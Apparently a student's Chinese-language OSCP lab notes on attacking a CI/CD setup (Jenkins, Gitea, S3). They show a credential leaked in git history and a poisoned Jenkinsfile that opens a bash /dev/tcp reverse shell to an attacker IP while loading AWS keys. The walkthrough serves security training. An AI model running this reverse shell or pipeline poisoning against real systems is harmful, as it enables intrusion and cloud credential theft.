---
title: '[OSCP, PEN-200] Instructional notes - Part 8'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 8
===

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 5"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 6"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%206.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 7"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%207.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 6](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%207.md) 內容

# Attacking AWS Cloud Infrastructure
AWS Cloud Infrastructure 的攻擊，針對 CI/CD 的漏洞與可能的攻擊方式。CI/CD 是現代雲端環境的核心，能夠自動化應用程式的建置、測試與部署，提升開發效率與穩定性。
>[!Tip]
>[CI/CD](https://en.wikipedia.org/wiki/CI/CD):
>Continuous Integration (CI) and Continuous Delivery (CD)

CI/CD OWASP Top 10
- CICD-SEC-1: Insufficient Flow Control Mechanisms
    - CI/CD 流程缺乏嚴格的檢查機制，能夠繞過安全限制
- CICD-SEC-2: Inadequate Identity and Access Management
    - 管理員未適當配置角色與權限，導致輕易提權
- CICD-SEC-3: Dependency Chain Abuse
    - 透過污染或竄改依賴項（第三方套件），讓 CI/CD pipeline 執行惡意程式碼
- CICD-SEC-4: Poisoned Pipeline Execution (PPE)
    - 獲取對 建置或部署腳本 的控制權，可能導致 Reverse Shell 或機密資訊竊取。
- CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)
    - CI/CD pipeline 未妥善保護敏感資料，可能導致竊取或濫用機密資訊
- CICD-SEC-6: Insufficient Credential Hygiene
    - 密碼、明文存儲憑證，或 API Token 洩漏
- CICD-SEC-7: Insecure System Configuration
    - CI/CD 伺服器與相關 application 存在安全漏洞
- CICD-SEC-8: Ungoverned Usage of 3rd Party Services
    - 使用 GitHub、Docker Hub 等第三方服務時，若未妥善管理權限
- CICD-SEC-9: Improper Artifact Integrity Validation
    - CI/CD pipeline 未驗證 Artifactsc是否遭篡改，可能允許植入惡意程式碼
- CICD-SEC-10: Insufficient Logging and Visibility
    - CI/CD pipeline 缺乏詳細的日誌記錄與監控，導致攻擊難以被偵測

## About the Public Cloud Labs
：再次申明「當個好駭客」\
![image](https://hackmd.io/_uploads/rJTTPFe3Jg.png)
## Leaked Secrets to Poisoned Pipeline - Lab Design
 Lab 模擬 CI/CD 系統的攻擊場景，同時啟動 多個服務，這包括：
1. 原始碼管理系統（SCM，Source Code Management）
2. 自動化伺服器（Jenkins）
3. 儲存庫（Repository Services）
4. Actual application
5. 支援 application 運作的 infrastructure


Lab 包含以下 三個主要 components，每個 components 對應 一個 subdomain
- Gitea: 原始碼管理系統（SCM），類似 GitHub 或 GitLab
- Jenkins: 自動化伺服器，用於執行 CI/CD Pipeline
- Application: 目標應用程式，是攻擊的主要對象。

![image](https://hackmd.io/_uploads/rknwO9-nkg.png)
### Accessing the Labs
#### 1. 列出目前的網路連線
```
┌──(chw㉿CHW)-[~]
└─$ nmcli connection
NAME                UUID                                  TYPE      DEVICE 
Wired connection 1  3fad19bc-1223-42bb-8a71-4519ecca8499  ethernet  eth0   
lo                  735b75b5-8789-4b4b-b693-05a081c177d7  loopback  lo     
tun0                b3c266a9-9280-43b6-8bf8-8dfcc199544d  tun       tun0  
```
> `Wired connection 1`：主要的網路連線名稱（有線網路）\
`eth0`：目前使用的網路介面
#### 2. 設定 DNS Server
使用 nmcli 指定實驗室提供的 DNS 伺服器 IP
```
┌──(chw㉿CHW)-[~]
└─$ sudo nmcli connection modify "Wired connection 1" ipv4.dns "{DNS Server IP}"
[sudo] password for chw: 

┌──(chw㉿CHW)-[~]
└─$ sudo systemctl restart NetworkManager
```
#### 3. 驗證 DNS 設定是否生效
檢查 `/etc/resolv.conf`
```                                
┌──(chw㉿CHW)-[~]
└─$ cat /etc/resolv.conf
# Generated by NetworkManager
search localdomain
nameserver {DNS Server IP}                                                                                               
┌──(chw㉿CHW)-[~]
└─$ nslookup git.offseclab.io
Server:         {DNS Server IP}
Address:        {DNS Server IP}#53

Non-authoritative answer:
Name:   git.offseclab.io
Address: {LAB IP}
```
> 成功解析 `git.offseclab.io` Domain

>[!Tip]
>每次重啟 LAB 後，需要重新設定 DNS\
>`sudo nmcli connection modify "Wired connection 1" ipv4.dns ""`
##  Enumeration
 Enumerate a CI/CD System
### Enumerating Jenkins
在 `automation.offseclab.io` 瀏覽 Jenkins\
![image](https://hackmd.io/_uploads/B15rfbNh1l.png)
> 如果 Jenkins 啟用了，`self-registration enabled`，通常會提供「註冊」選項。

#### 1. 使用 Metasploit Enumeration Jenkins
由於 登入受限，改用 Metasploit 來 自動化掃描
##### 1.1 初始化 Metasploit 資料庫 & 啟動
```
┌──(chw㉿CHW)-[~]
└─$ sudo msfdb init
┌──(chw㉿CHW)-[~]
└─$ msfconsole --quiet
msf6 >
```
選擇 Jenkins 掃描 module
```
msf6 > use auxiliary/scanner/http/jenkins_enum
msf6 auxiliary(scanner/http/jenkins_enum) > show options

Module options (auxiliary/scanner/http/jenkins_enum):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:por
                                         t][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/d
                                         ocs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.
```
##### 1.2 設定掃描目標
將 目標伺服器設定為 `automation.offseclab.io`，並將 `TARGETURI` 設為 `/`
```
msf6 auxiliary(scanner/http/jenkins_enum) > set RHOSTS automation.offseclab.io
msf6 auxiliary(scanner/http/jenkins_enum) > set TARGETURI /
```
#### 1.3 執行掃描
```
msf6 auxiliary(scanner/http/jenkins_enum) > run

[+] 54.86.68.66:80        - Jenkins Version 2.385
[*] /script restricted (403)
[*] /view/All/newJob restricted (403)
[*] /asynchPeople/ restricted (403)
[*] /systemInfo restricted (403)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
> 取得 Jenkins 版本：2.385\
🥚 許多 API 回應 403 Forbidden

儘管沒有拿到權限，但我們取得了 Jenkins 版本，可以尋找已知漏洞（CVE）

#### - 搜尋公開漏洞
使用 `Exploit-DB` 或 `CVE Database` 搜尋: Jenkins Version 2.385
#### - Directory busting
`dirb` 或 `dirseaarch`

為了不浪費時間，先轉向 `git.offseclab.io`（Gitea Server），尋找其他可能的攻擊點。

### Enumerating the Git Server
Git 伺服器 Enumeration:
- 託管型 hosted SCM（GitHub、GitLab 等）
    - 託管在 第三方雲端（如 GitHub、GitLab）。
    - 以 開放情報蒐集（OSINT） 為主，例如：
        - 搜尋公開 repo
        - 查看組織內的成員
        - 分析過往的 Commit
    - 通常不會對 GitHub 或 GitLab 本身進行攻擊，因為這是第三方資產，且它們的安全性較高。

- 自架 own SCM（如 Gitea、Self-hosted GitLab）
    - 企業自行架設 SCM 伺服器。
    - 可以針對 SCM 軟體本身進行漏洞測試，例如：
        - 探測版本號，搜尋已知漏洞
        - 測試 API 是否開放未授權存取
        - 嘗試 Brute-force 使用者密碼
        - 搜尋公開的機密資訊（如 API 金鑰、憑證）

#### 1. 訪問 SCM Server
http://git.offseclab.io/\
![image](https://hackmd.io/_uploads/rynb3ZV2ke.png)
> Explore: 用來搜尋公開的專案或使用者
> Sign In: 需要帳號密碼 
#### 2. 確認 SCM 版本
![image](https://hackmd.io/_uploads/ByDS3b4hyl.png)
> Version: 1.18.0

#### 3. Explore 公開的 Repositories
![image](https://hackmd.io/_uploads/SkBZT-N3kg.png)
共有 5 個 users: `Billy`, `Jack`, `Lucy`, `Roger`, `administrator`

如果 SCM 目前沒有開放的攻擊點，我們可以轉向 Application（app.offseclab.io），看看是否有 憑證洩漏 或其他漏洞
### Enumerating the Application
#### 1. 訪問 Application
http://app.offseclab.io/\
![image](https://hackmd.io/_uploads/rJecC-NhJx.png)
#### 2. 使用 dirb 掃描隱藏目錄
可能有未列出的 API 或管理端點

#### 3. 檢查網頁 HTML Source code
因為應用程式是自訂的（Custom Application），可能包含開發者遺漏的資訊，打開 網頁原始碼（View Page Source）。
使用 `view-source:`+`http://app.offseclab.io/index.html`，可以看網頁原始碼\
![image](https://hackmd.io/_uploads/Bk_zefV31g.png)
> 發現 S3 bucket

#### 4. 測試 S3 Bucket 權限
https://staticcontent-{S3BucketID}.s3.us-east-1.amazonaws.com/\
![image](https://hackmd.io/_uploads/S1CPbz4nyg.png)
> AccessDenied
> 但至少知道該 Bucket 是公開的，可能還有其他可用的攻擊方式\
下一步：使用 dirb 測試是否有可存取的隱藏檔案

#### 5. 使用 dirb 嘗試列舉 S3 Bucket
```
┌──(chw㉿CHW)-[~]
└─$ dirb https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com 
...
GENERATED WORDS: 4612                                                          

---- Scanning URL: https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com/ ----
+ https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com/.git/HEAD (CODE:200|SIZE:23)
...
```
>`https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com/.git/HEAD`
> Bucket 內有 `.git/HEAD`，表示整個 Git Bucket 存放在 S3 上\
> 如果能夠存取 `.git` 內的其他檔案，就可能還原整個程式碼庫

單純用 dirb 逐一測試 Git 檔案效率不高，需要更有效的方法來下載資料

#### 6. 使用 AWS CLI 嘗試列出 S3 Bucket
雖然 public 無法直接讀取內容，但 AWS Authenticated User 可能仍然能存取
```
┌──(chw㉿CHW)-[~]
└─$ aws configure
AWS Access Key ID [None]: {Access Key ID}
AWS Secret Access Key [None]: {Secret Access Key}
Default region name [None]: us-east-1
Default output format [None]: 

┌──(chw㉿CHW)-[~]
└─$ aws s3 ls staticcontent-{S3Bucket ID}/
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2025-03-16 04:12:30        972 CONTRIBUTING.md
2025-03-16 04:12:30         79 Caddyfile
2025-03-16 04:12:30        407 Jenkinsfile
2025-03-16 04:12:30        879 README.md
2025-03-16 04:12:30        176 docker-compose.yml
```
> 成功列出存儲桶內容
>> `.git/` 目錄: 包含完整的程式碼庫
`Jenkinsfile`: Jenkins Pipeline 設定檔，可能包含憑證或 API 金鑰\
`docker-compose.yml`: 可能包含環境變數或設定檔\
`README.md`、`Caddyfile`: 可能透露伺服器架構資訊

## Discovering Secrets
- 發現哪些文件可以訪問
- 分析 Git 歷史記錄

### Downloading the Bucket
#### 1. 列出 S3 Bucket 內容
```
┌──(chw㉿CHW)-[~]
└─$ aws s3 ls staticcontent-{S3Bucket ID}/
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2025-03-16 04:12:30        972 CONTRIBUTING.md
2025-03-16 04:12:30         79 Caddyfile
2025-03-16 04:12:30        407 Jenkinsfile
2025-03-16 04:12:30        879 README.md
2025-03-16 04:12:30        176 docker-compose.yml
```
#### 2. 測試可存取的文件
嘗試下載 `README.md` 確認是否有權限
```
┌──(chw㉿CHW)-[~]
└─$ aws s3 cp s3://staticcontent-{S3Bucket ID}//README.md ./
download: s3://staticcontent-{S3Bucket ID}//README.md to ./README.md

┌──(chw㉿CHW)-[~]
└─$ cat README.md
...
## How to use

To use the content in this repository, simply clone or download the repository and access the files as needed. If you have access to the S3 bucket and would like to upload the content to the bucket, you can use the provided script:

./scripts/upload-to-s3.sh
...
```
> 下載成功，表示 該 bucket 部分內容是可讀取

嘗試下載整個 S3 bucket
```
┌──(chw㉿CHW)-[~]
└─$ mkdir S3-bucket

┌──(chw㉿CHW)-[~]
└─$ cd S3-bucket 
         
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ aws s3 sync s3://staticcontent-{S3Bucket ID}/ ./
...

┌──(chw㉿CHW)-[~/S3-bucket]
└─$ tree                               
.
├── CONTRIBUTING.md
├── Caddyfile
├── Jenkinsfile
├── README.md
├── docker-compose.yml
├── images
│   ├── bunny.jpg
│   ├── golden-with-flower.jpg
│   ├── kittens.jpg
│   └── puppy.jpg
├── scripts
│   ├── update-readme.sh
│   └── upload-to-s3.sh
└── webroot
    └── index.html

4 directories, 12 files
```
> 有權限讀取整個 S3 bucket

#### 3. 分析 script
- 分析 `upload-to-s3.sh` script
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ cat scripts/upload-to-s3.sh 
# Upload images to s3

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

AWS_PROFILE=prod aws s3 sync $SCRIPT_DIR/../ s3://staticcontent-{S3Bucket ID}/ 
```
> 未發現可用的資訊

- 分析 `update-readme.sh` script
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ cat scripts/upload-to-s3.sh
```
```sh
# Update Readme to include collaborators images to s3

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

SECTION="# Collaborators"
FILE=$SCRIPT_DIR/../README.md

if [ "$1" == "-h" ]; then
  echo "Update the collaborators in the README.md file"
  exit 0
fi

if [ "$#" -ne 2 ]; then
  echo "Usage: $0 USERNAME PASSWORD"
  exit 1
fi

username=$1
password=$2

auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")

USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username |  tr -d '"')

sed -i "/^$SECTION/,/^#/{/$SECTION/d;//!d}" $FILE
echo "$SECTION" >> $FILE
echo "$USERNAMES" >> $FILE
echo "" >> $FILE
```
> 從 Git 伺服器（git.offseclab.io）獲取 repo 名單\
Jack 是這個 repo 的擁有者\
接受 `USERNAME` 和 `PASSWORD` 作為參數，接著發送 API request\
>> 如果能找到執行過這個腳本的 user bash history，可能拿到憑證

### Searching for Secrets in Git
#### 1. 使用 gitleaks 自動搜尋敏感資訊
安裝 `gitleaks`
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ sudo apt update
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ sudo apt install -y gitleaks
```
執行 `gitleaks` 掃描 Git repo
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ gitleaks detect

    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks

6:33AM INF 7 commits scanned.
6:33AM INF scan completed in 63.4ms
6:33AM INF no leaks found
```
> 沒有發現敏感資訊

#### 2. 手動檢查 Git history
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ git log
commit 85898c851b959830ec6b4669726434607df652ac (HEAD -> master, origin/master)
Author: Jack <jack@offseclab.io>
Date:   Sat Mar 15 08:12:27 2025 +0000

    Add Jenkinsfile

commit a93d6e3d4c5227878d89fa81451f988373e78662
Author: Jack <jack@offseclab.io>
Date:   Fri Mar 14 08:12:27 2025 +0000

    Fix issue
...
```
> `Fix issue`: 可能與安全漏洞有關\
`Add Jenkinsfile`: 可能與 CI/CD pipeline 相關

#### 3. 分析 Git 變更記錄
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ git show a93d6e3d4c5227878d89fa81451f988373e78662
...
-USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H 'authorization: Basic YWRtaW5pc3RyYXRvcjphMm53c3VkdzFmM2lxbDhj' | jq .\[\].username |  tr -d '"')
+# Check if both arguments are provided
+if [ "$#" -ne 2 ]; then
+  # If not, display a help message
+  echo "Usage: $0 USERNAME PASSWORD"
+  exit 1
+fi
+
+# Store the arguments in variables
+username=$1
+password=$2
+
+auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")
+
+USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username |  tr -d '"')
...
```
> 修改前的原始腳本直接使用 hard coded 的 API 金鑰（Base64 編碼的 authorization: Basic）\
修改為從 cmd 參數輸入帳號密碼
>> 過去提交的 API 金鑰可能會有效

- 解碼 hard coded 的 API 金鑰
![image](https://hackmd.io/_uploads/rkqMoX4hkg.png)

#### 4. 使用解碼的憑證登入 SCM 伺服器
http://git.offseclab.io/user/login\
![image](https://hackmd.io/_uploads/rkd2i7Enkl.png)
> `administrator`:`a2nwsudw1f3iql8c`

成功登入：\
![image](https://hackmd.io/_uploads/SkYAsmE2Jx.png)

## Poisoning the Pipeline
如何利用 CI/CD Pipeline 來執行惡意代碼（Poisoning the Pipeline），以獲取 遠端 Shell 存取 Jenkins 伺服器
> 在 Jenkins 中，通常定義在 `Jenkinsfile`，如果能夠 修改 Jenkinsfile，就可以寫入惡意指令，讓 Pipeline 執行我們的攻擊 payload。
### Enumerating the Repositories
目前已使用 `administrator` 登入 Gitea（SCM Server），再次點擊「Explore」來查看 所有的 Repository。\
![image](https://hackmd.io/_uploads/B1oPpXN3yx.png)
> 多了 `image-transform`，且 `image-transform` 中有 `Jenkinsfile`

#### 1. 檢查 `static_content` 的 Jenkinsfile
![image](https://hackmd.io/_uploads/H1aFCmV31x.png)
> 這份 Jenkinsfile 目前只 echo 訊息，並沒有實際執行任何有效的建置步驟。

#### 2. 檢查 `image-transform` 的 Jenkinsfile
![image](https://hackmd.io/_uploads/HkzZyEN2yl.png)
> 這份 Jenkinsfile 會執行 [CloudFormation](https://docs.aws.amazon.com/cloudformation/index.html) 配置
> >
`withAWS(region:'us-east-1', credentials:'aws_key')
Jenkins` 載入 AWS 金鑰（`AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY`）\
嘗試竊取這些憑證，進一步入侵 AWS

>[!Important]
>使用 `cfnUpdate` 來建立 CloudFormation Stack\
表示這個 Pipeline 擁有至少 AWS CloudFormation 管理權限，可能允許我們 創建新資源、修改 S3 Bucket。

#### 3. 檢查 CloudFormation template
##### 3.1 CloudFormation conf
Jenkinsfile 會使用 `image-processor-template.yml`，檢查檔案\
![image](https://hackmd.io/_uploads/rkl1hl4Nnye.png)
> CloudFormation 建立了兩個 S3 Bucket，用來儲存原圖和縮圖

##### 3.2 lambda function
![image](https://hackmd.io/_uploads/H1XpZVE21l.png)
> Lambda function 將圖片從 `SOURCE_BUCKET` 移動到 `DESTINATION_BUCKET`\
可能擁有 S3 寫入權限，可以嘗試修改

##### 3.3  IAM 角色權限
![image](https://hackmd.io/_uploads/r11kX4E21g.png)
> IAM 允許 Lambda 存取 S3 bucket，但 權限有限\
更高權限的 AWS Key 可能儲存在 Jenkins

>[!Note]
>現在可以編輯 Jenkinsfile，但需要確認**如何觸發 build**。Jenkins 可能被設定為只能 manual intervention，如果是這種情況，我們就需要繼續探索。\
Jenkins 也有可能被設定為 routinely execute Pipeline，在這種情況下，我們無法立即觸發它，必須等待它自動執行。另外，Jenkins 可能會在 repo 變更時自動執行建置，通常是透過 SCM Server（如 Gitea 或 GitHub）發送 Webhook 觸發。

#### 4. 檢查 Webhook 設定
![image](https://hackmd.io/_uploads/HJLcNENh1x.png)
![image](https://hackmd.io/_uploads/HyE1rNVhyg.png)
> Webhook 被設定為「Git push to a repository 時觸發 Jenkins Pipeline」\
這代表我們可以透過修改 Jenkinsfile，讓 Pipeline 自動執行

### Modifying the Pipeline
利用 CI/CD Pipeline 植入惡意程式碼，以獲取 Jenkins 建置伺服器的存取權限

目標: 取得 AWS 存取金鑰並嘗試入侵 AWS 環境
- 修改 Jenkinsfile 植入反向 Shell
- 觸發 Jenkins Webhook 讓惡意代碼執行
- 取得 Jenkins 建置伺服器的 Shell 存取權限
- 在建置伺服器上進行環境偵查
- 發現 AWS 存取金鑰，準備進一步攻擊

#### 1. 編輯 Jenkinsfile，植入 Reverse Shell
保留原本的 AWS 金鑰設定（確保 pipeline 能存取 AWS），使用 `sh` 執行反向 Shell，透過 `bash -c` 確保指令在 Jenkins 伺服器正確執行\
設定 Shell 連回 Kali ，並放入背景執行 (&)
>[!Note]
>Jenkinsfile 的語法是基於 [domain-specific language (DSL)](https://en.wikipedia.org/wiki/Domain-specific_language) 。這意味著我們需要用 Jenkins DSL 語法來編寫 Reverse shell

原始 `Jenkinsfile`:
```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        echo 'Building..'
      }
    }
  }
}
```
修改後 `Jenkinsfile`:
```
pipeline {
  agent any
  stages {
    stage('Send Reverse Shell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/192.168.45.168/8888 0>&1" &'
            }
          }
        }
      }
    }
  }
}
```
緩緩
LAB restart 後，administrator 就不進去了

# Assembling the Pieces
模擬一場真實的滲透測試
- Enumerating the Public Network
- Attacking a Public Machine
- Gaining Access to the Internal Network
- Enumerating the Internal Network
- Attacking an Internal Web Application
- Gaining Access to the Domain Controller

## Enumerating the Public Network
Enumerating 公開網路上的機器
![image](https://hackmd.io/_uploads/rycUywEn1l.png)
- MAILSRV1
- WEBSRV1
